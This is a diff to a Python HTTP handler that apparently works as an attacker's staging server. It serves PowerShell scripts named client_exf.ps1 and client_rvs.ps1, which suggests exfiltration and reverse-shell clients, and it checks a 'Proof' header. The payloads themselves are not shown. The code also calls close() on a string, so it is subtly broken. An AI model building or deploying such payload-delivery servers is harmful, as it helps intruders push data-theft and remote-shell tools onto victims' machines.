@@ -17,17 +17,30 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
 
     def do_GET(self):
         headers = self.headers
-        if self.path == '/client.ps1':
+        if self.path == '/client_exf.ps1':
             try:
-                file_to_open = open('client.ps1','r').read()
+                file_to_open = open('client_exf.ps1','r').read()
                 self.send_response(200)
                 self.send_header('Content-type', 'text')
                 self.end_headers()
                 self.wfile.write(bytes(file_to_open, 'utf-8'))
-                log('[+] File client.ps1 has been requested and was sent!',print_console=True,trace_time=True)
+                log('[+] File client_exf.ps1 has been requested and was sent!',print_console=True,trace_time=True)
                 file_to_open.close()
             except:
-                log('[-] File client.ps1 does not exist.',print_console=True,trace_time=True)
+                log('[-] File client_exf.ps1 does not exist.',print_console=True,trace_time=True)
+                self.send_response(404)
+                self.wfile.write(b'Not Found')
+        elif self.path == '/client_rvs.ps1':
+            try:
+                file_to_open = open('client_rvs.ps1','r').read()
+                self.send_response(200)
+                self.send_header('Content-type', 'text')
+                self.end_headers()
+                self.wfile.write(bytes(file_to_open, 'utf-8'))
+                log('[+] File client_rvs.ps1 has been requested and was sent!',print_console=True,trace_time=True)
+                file_to_open.close()
+            except:
+                log('[-] File client_rvs.ps1 does not exist.',print_console=True,trace_time=True)
                 self.send_response(404)
                 self.wfile.write(b'Not Found')
         elif headers['Proof']:    
